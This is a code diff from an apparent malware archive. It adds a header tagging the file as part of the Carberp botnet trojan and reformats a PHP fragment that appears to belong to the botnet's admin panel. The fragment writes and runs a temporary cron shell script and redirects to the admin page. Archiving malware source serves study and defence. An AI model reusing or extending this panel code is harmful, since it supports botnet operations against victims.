@@ -1,9 +1,22 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
-function datediff($a){	return ((time() - strtotime($a)) / 60) / 60;
+function datediff($a){
+	return ((time() - strtotime($a)) / 60) / 60;
 }
 
-if($Cur['x'] == 'check'){	$dir = realpath('.') . '/';
+if($Cur['x'] == 'check'){
+	$dir = realpath('.') . '/';
 
 	file_put_contents('/tmp/check.sh', '#!/bin/sh' . "\n");
 	file_put_contents('/tmp/check.sh', 'cd ' . $dir . 'crons/' . "\n", FILE_APPEND);
@@ -13,7 +26,8 @@ if($Cur['x'] == 'check'){	$dir = realpath('.') . '/';
 	unlink('/tmp/check.sh');
 
 	sleep(3);
-	header('Location: /admins/');
+
+	header('Location: /admins/');
 }
 if(file_exists('cache/pid_checks.txt')) $smarty->assign('pid_checks', true);
 
